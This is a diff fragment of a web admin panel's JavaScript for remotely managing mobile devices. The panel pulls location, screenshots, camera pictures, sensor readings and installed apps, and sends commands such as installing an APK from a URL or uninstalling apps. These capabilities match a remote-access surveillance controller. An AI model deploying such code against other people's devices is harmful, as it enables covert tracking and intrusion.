+                 pocketModel.position.set(0, 1.2, 0);
+                 phoneModel.position.copy(pocketModel.position);
+            } else if (data.proximity?.distance < 2) {
+                positionText = "Calling Position";
+                phoneModel.position.set(0, 1.3, 0);
+            } else if (data.gravity) {
+                if (Math.abs(data.gravity.z) > 9.0) {
+                    positionText = "On a Surface";
+                    phoneModel.position.set(0, 0.075 + 0.05, 0);
+                } else {
+                    positionText = "In Hand";
+                    phoneModel.position.set(0, 1.3, 0);
                 }
-                if(!res.ok) throw new Error(`Server error: ${res.status}`);
-                const data = await res.json();
-                parseAndDisplayData(data);
-                updateStatusLog("Device data refreshed successfully.", "success");
-            } catch(e) {
-                console.error("Data fetch failed:", e);
-                updateStatusLog("Failed to fetch device data: " + e.message, "error");
+            } else {
+                phoneModel.position.set(0, 1.3, 0); // Default to 'in hand' if no other context
             }
+            
+            // Add a note if orientation data is missing for clarity.
+            if (!hasGoodOrientation && positionText !== "Undetermined") {
+                positionText += " (Orientation Unavailable)";
+            }
+            
+            document.getElementById('position-status').textContent = positionText;
         }
         
+        function startAnimationLoop(){animationFrameId&&cancelAnimationFrame(animationFrameId);const e=()=>{animationFrameId=requestAnimationFrame(e),controls.update(),renderer.render(scene,camera)};e()}function stopAnimationLoop(){animationFrameId&&(cancelAnimationFrame(animationFrameId),animationFrameId=null),window.removeEventListener("resize",onWindowResize)}function onWindowResize(){const e=document.getElementById("visualizer");e&&camera&&renderer&&(camera.aspect=e.clientWidth/e.clientHeight,camera.updateProjectionMatrix(),renderer.setSize(e.clientWidth,e.clientHeight))}function switchTab(e){document.querySelectorAll(".tab-content").forEach(e=>e.classList.remove("active")),document.querySelectorAll(".tab").forEach(e=>e.classList.remove("active")),document.getElementById(e).classList.add("active"),document.querySelector(`.tab[onclick="switchTab('${e}')"]`).classList.add("active")}function checkUiPassword(){document.getElementById("ui-password-input").value===UI_UNLOCK_PASSWORD?(sessionStorage.setItem("isAuthenticated","true"),isAuthenticated=!0,showAdminPanel()):alert("Incorrect password! Please try again.")}function showAdminPanel(){document.getElementById("password-view").style.display="none",document.getElementById("admin-panel-view").style.display="block",document.getElementById("device-dropdown").options.length<=1&&(populateDropdown("device-dropdown",DEVICES_JSON_URL,"Device"),populateDropdown("action-dropdown",COMMANDS_JSON_URL,"Command"))}async function populateDropdown(e,t,o){const n=document.getElementById(e);try{const a=await fetch(t);if(!a.ok)throw new Error(`Failed to fetch ${o}s`);const i=await a.json();n.innerHTML="",n.add(new Option(`-- Select a ${o} --`,"")),i.forEach(e=>{n.add(new Option(e.name||e.value,e.id||e.value,!1,e.disabled))})}catch(a){console.error(`Error loading ${o}s:`,a),n.innerHTML=`<option value="">-- Error Loading ${o}s --</option>`}}function showModal(e){document.getElementById(e).style.display="flex",e==="visualizer-modal"&&!animationFrameId&&(void 0!==THREE&&void 0!==THREE.OrbitControls?initVisualizer():document.getElementById("visualizer").innerHTML='<p style="color: red; text-align: center; padding-top: 50px;">Error: 3D visualization library failed to load.</p>')}function hideModal(e){"visualizer-modal"===e&&stopAnimationLoop(),document.getElementById(e).style.display="none"}function onDeviceSelected(){["data-screen","data-battery","data-charging","data-location","data-current-app","data-proximity","data-light"].forEach(e=>safeUpdateElement(e,"--")),document.getElementById("visualize-btn").disabled=!0,updateStatusLog("New device selected. Click 'Refresh Data' to fetch its status.","info")}async function forceRefresh(){const e=document.getElementById("refresh-btn"),t=document.getElementById("refresh-text"),o=document.getElementById("refresh-spinner");e.disabled=!0,t.textContent="Refreshing...",o.style.display="inline-block",await fetchLatestData(),e.disabled=!1,t.textContent="Refresh Data",o.style.display="none"}async function fetchLatestData(){const e=document.getElementById("device-dropdown").value;if(!e)return void updateStatusLog("Please select a device first.","error");try{const t=await fetch(`/.netlify/functions/get-status?deviceId=${e}`);if(404===t.status)return void updateStatusLog("No data found for this device yet. Send a command to initialize it.","warning");if(!t.ok)throw new Error(`Server error: ${t.status}`);const o=await t.json();parseAndDisplayData(o),updateStatusLog("Device data refreshed successfully.","success")}catch(t){console.error("Data fetch failed:",t),updateStatusLog("Failed to fetch device data: "+t.message,"error")}}
         function parseAndDisplayData(allData) {
             let hasSensorData = false;
-            // Clear previous data before populating
             onDeviceSelected();
-
             for (const key in allData) {
                 const payload = allData[key]?.payload;
                 if (!payload) continue;
@@ -595,38 +363,27 @@
                         case "battery_status":
                             if (payload?.percentage !== undefined) {
                                 safeUpdateElement("data-battery", `${payload.percentage.toFixed(0)}%`);
-                                // New: Update charging status field
                                 safeUpdateElement("data-charging", payload.isCharging ? "✅ Charging" : "❌ Not Charging");
                             }
                             break;
-                        case "location":
-                            payload?.latitude ? safeUpdateElement("data-location", `${payload.latitude.toFixed(4)}, ${payload.longitude.toFixed(4)}`) : safeUpdateElement("data-location", payload || "N/A");
-                            break;
+                        case "location": payload?.latitude ? safeUpdateElement("data-location", `${`${payload.latitude.toFixed(4)}, ${payload.longitude.toFixed(4)}`}`) : safeUpdateElement("data-location", payload || "N/A"); break;
                         case "current_app": safeUpdateElement("data-current-app", payload || "N/A"); break;
-                        case "proximity":
-                            if (payload?.distance !== undefined) safeUpdateElement("data-proximity", `${payload.distance} cm`);
-                            hasSensorData = true;
-                            break;
-                        case "light":
-                             if (payload?.lux !== undefined) safeUpdateElement("data-light", `${payload.lux.toFixed(1)} lux`);
-                             hasSensorData = true;
-                             break;
-                        // New: Handle screenshot data
+                        case "proximity": if (payload?.distance !== undefined) safeUpdateElement("data-proximity", `${payload.distance} cm`); hasSensorData = true; break;
+                        case "light": if (payload?.lux !== undefined) safeUpdateElement("data-light", `${payload.lux.toFixed(1)} lux`); hasSensorData = true; break;
                         case "screenshot":
-                            if(payload) {
-                                document.getElementById('screenshot-image').src = `data:image/jpeg;base64,${payload}`;
-                                showModal('screenshot-modal');
-                            }
-                            break;
-                        default:
-                            if (["rotation_vector", "gravity", "magnetometer"].includes(key)) hasSensorData = true;
-                            break;
+                             document.getElementById('image-modal-title').textContent = "Screenshot";
+                             document.getElementById('image-display').src = `data:image/jpeg;base64,${payload}`;
+                             showModal('image-modal');
+                             break;
+                        case "picture":
+                             document.getElementById('image-modal-title').textContent = "Camera Picture";
+                             document.getElementById('image-display').src = `data:image/jpeg;base64,${payload}`;
+                             showModal('image-modal');
+                             break;
+                        default: if (["rotation_vector", "gravity", "magnetometer"].includes(key)) hasSensorData = true; break;
                     }
-                } catch(e) {
-                    console.error(`Error processing display data for ${key}:`, e);
-                }
+                } catch(e) { console.error(`Error processing display data for ${key}:`, e); }
             }
-
             if(hasSensorData) {
                 document.getElementById("visualize-btn").disabled = false;
                 const sensorPayload = {};
@@ -634,76 +391,12 @@
                 analyzeAndSetPosition(sensorPayload);
             }
         }
-        
-        function safeUpdateElement(t,e){const o=document.getElementById(t);o&&(o.textContent=e)}
-        
-        // REBUILT: Central command function
-        async function sendCommandWithValue(action, extraData = {}) {
-            const deviceId = document.getElementById("device-dropdown").value;
-            const password = document.getElementById("backend-password").value;
-            const button = document.getElementById("send-button"); // Use main button for visual feedback
-
-            if (!deviceId || !action || !password) {
-                return updateStatusLog("Error: Device, Action, and Password are required.", "error");
-            }
-
-            const originalButtonText = button.innerHTML;
-            button.disabled = true;
-            button.innerHTML = '<span class="loading-spinner"></span> Sending...';
-            
-            try {
-                const body = { deviceId, action, password, ...extraData };
-                const res = await fetch("/.netlify/functions/send-command", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(body)
-                });
-                const data = await res.json();
-                if (res.ok) {
-                    updateStatusLog(`✅ Success: ${data.message}`, "success");
-                    // If it was a 'get' command, automatically refresh data after a short delay
-                    if (action.startsWith("get_") || action.startsWith("take_") || action === "list_apps") {
-                        setTimeout(() => forceRefresh(), 2000);
-                    }
-                } else {
-                    updateStatusLog(`❌ Error: ${data.error || "Unknown server error"}`, "error");
-                }
-            } catch (err) {
-                updateStatusLog("❌ Network Error: Could not reach the command function.", "error");
-            } finally {
-                button.disabled = false;
-                button.innerHTML = originalButtonText;
-            }
-        }
-        
-        // MODIFIED: This function now just calls the central command function
-        function sendCommandFromDropdown() {
-            const action = document.getElementById("action-dropdown").value;
-            sendCommandWithValue(action);
-        }
-
-        // NEW: Functions for the Media tab
-        function playSound() {
-            const url = document.getElementById('sound-url-input').value;
-            if (url) sendCommandWithValue('play_sound', { url: url });
-            else updateStatusLog('Please enter a sound URL.', 'error');
-        }
-
-        function showImage() {
-            const url = document.getElementById('image-url-input').value;
-            if (url) sendCommandWithValue('show_image', { url: url });
-            else updateStatusLog('Please enter an image URL.', 'error');
-        }
-        
-        function updateStatusLog(t,e="info"){const o=document.getElementById("status-log");o.textContent=t,o.className=`status-log log-${e}`}
-        function showAppList(){const t=document.getElementById("device-dropdown").value;t?Object.keys(installedApps).length>0?(renderAppList(),void showModal("app-list-modal")):fetchAppList():updateStatusLog("Please select a device first","error")}
-        async function fetchAppList(){const t=document.getElementById("device-dropdown").value;if(!t)return;try{const e=await fetch(`/.netlify/functions/get-status?deviceId=${t}&type=installed_apps`);if(!e.ok)throw new Error(`Server responded with status: ${e.status}`);const o=await e.json();o.installed_apps&&o.installed_apps.payload?(installedApps=o.installed_apps.payload,renderAppList(),showModal("app-list-modal")):updateStatusLog("No app list data found for this device.","warning")}catch(e){console.error("Could not fetch app list:",e),updateStatusLog("Failed to fetch app list: "+e.message,"error")}}
-        
-        // MODIFIED: Added onclick to open apps
-        function renderAppList(){const t=document.getElementById("app-list-container");if(t){t.innerHTML="";const e=Object.entries(installedApps).map(([t,e])=>({pkg:t,name:e}));e.sort((t,e)=>t.name.localeCompare(e.name)),e.forEach(e=>{const o=document.createElement("div");o.className="app-item",o.onclick=()=>sendCommandWithValue("open_app",{package_name:e.pkg});const n=document.createElement("div");n.className="app-name",n.textContent=e.name;const a=document.createElement("div");a.className="app-package",a.textContent=e.pkg,o.appendChild(n),o.appendChild(a),t.appendChild(o)});const o=document.createElement("div");o.style.padding="10px",o.style.fontSize="14px",o.style.color="var(--text-light)",o.textContent=`Showing ${e.length} applications`,t.appendChild(o)}}
-        
-        function filterApps(){const t=document.getElementById("app-search").value.toLowerCase();document.querySelectorAll(".app-item").forEach(e=>{const o=e.querySelector(".app-name").textContent.toLowerCase(),n=e.querySelector(".app-package").textContent.toLowerCase();e.style.display=o.includes(t)||n.includes(t)?"flex":"none"})}
-        window.onload=()=>{isAuthenticated&&showAdminPanel(),document.addEventListener("keydown",t=>{"Escape"===t.key&&(hideModal("visualizer-modal"),hideModal("app-list-modal"),hideModal("screenshot-modal"))})};
+        function safeUpdateElement(e,t){const o=document.getElementById(e);o&&(o.textContent=t)}async function sendCommandWithValue(e,t={}){const o=document.getElementById("device-dropdown").value,n=document.getElementById("backend-password").value,a=document.getElementById("send-button");if(!o||!e||!n)return updateStatusLog("Error: Device, Action, and Password are required.","error");const i=a.innerHTML;a.disabled=!0,a.innerHTML='<span class="loading-spinner"></span> Sending...';try{const d=await fetch("/.netlify/functions/send-command",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({deviceId:o,action:e,password:n,...t})}),s=await d.json();d.ok?(updateStatusLog(`✅ Success: ${s.message}`,"success"),(e.startsWith("get_")||e.startsWith("take_")||"list_apps"===e)&&setTimeout(()=>forceRefresh(),2e3)):updateStatusLog(`❌ Error: ${s.error||"Unknown server error"}`,"error")}catch(d){updateStatusLog("❌ Network Error: Could not reach the command function.","error")}finally{a.disabled=!1,a.innerHTML=i}}function sendCommandFromDropdown(){const e=document.getElementById("action-dropdown").value;sendCommandWithValue(e)}function playSound(){const e=document.getElementById("sound-url-input").value;e?sendCommandWithValue("play_sound",{url:e}):updateStatusLog("Please enter a sound URL.","error")}function showImage(){const e=document.getElementById("image-url-input").value;e?sendCommandWithValue("show_image",{url:e}):updateStatusLog("Please enter an image URL.","error")}
+        function setVolume() { const e=document.getElementById("volume-slider").value;sendCommandWithValue("set_volume",{level:e}) }
+        function installApp() { const e=document.getElementById("app-url-input").value;e?sendCommandWithValue("install_app",{url:e}):updateStatusLog("Please enter an APK URL.","error") }
+        function uninstallApp() { const e=document.getElementById("app-package-input").value;e?sendCommandWithValue("uninstall_app",{package_name:e}):updateStatusLog("Please enter a package name.","error") }
+        function takePicture(e) { sendCommandWithValue("take_picture",{camera_id:e}) }
+        function updateStatusLog(e,t="info"){const o=document.getElementById("status-log");o.textContent=e,o.className=`status-log log-${t}`}function showAppListModal(){const e=document.getElementById("device-dropdown").value;e?Object.keys(installedApps).length>0?(renderAppList(),void showModal("app-list-modal")):fetchAppList():updateStatusLog("Please select a device first","error")}async function fetchAppList(){const e=document.getElementById("device-dropdown").value;if(!e)return;try{const t=await fetch(`/.netlify/functions/get-status?deviceId=${e}&type=installed_apps`);if(!t.ok)throw new Error(`Server responded with status: ${t.status}`);const o=await t.json();o.installed_apps&&o.installed_apps.payload?(installedApps=o.installed_apps.payload,renderAppList(),showModal("app-list-modal")):updateStatusLog("No app list data found for this device.","warning")}catch(t){console.error("Could not fetch app list:",t),updateStatusLog("Failed to fetch app list: "+t.message,"error")}}function renderAppList(){const e=document.getElementById("app-list-container");if(e){e.innerHTML="";const t=Object.entries(installedApps).map(([e,t])=>({pkg:e,name:t}));t.sort((e,t)=>e.name.localeCompare(t.name)),t.forEach(t=>{const o=document.createElement("div");o.className="app-item",o.onclick=()=>sendCommandWithValue("open_app",{package_name:t.pkg});const n=document.createElement("div");n.className="app-name",n.textContent=t.name;const a=document.createElement("div");a.className="app-package",a.textContent=t.pkg,o.appendChild(n),o.appendChild(a),e.appendChild(o)});const o=document.createElement("div");o.style.padding="10px",o.style.fontSize="14px",o.style.color="var(--text-light)",o.textContent=`Showing ${t.length} applications`,e.appendChild(o)}}function filterApps(){const e=document.getElementById("app-search").value.toLowerCase();document.querySelectorAll(".app-item").forEach(t=>{const o=t.querySelector(".app-name").textContent.toLowerCase(),n=t.querySelector(".app-package").textContent.toLowerCase();t.style.display=o.includes(e)||n.includes(e)?"flex":"none"})}window.onload=()=>{isAuthenticated&&showAdminPanel(),document.addEventListener("keydown",e=>{"Escape"===e.key&&(hideModal("visualizer-modal"),hideModal("app-list-modal"),hideModal("image-modal"))})};
     </script>
 </body>
 </html>
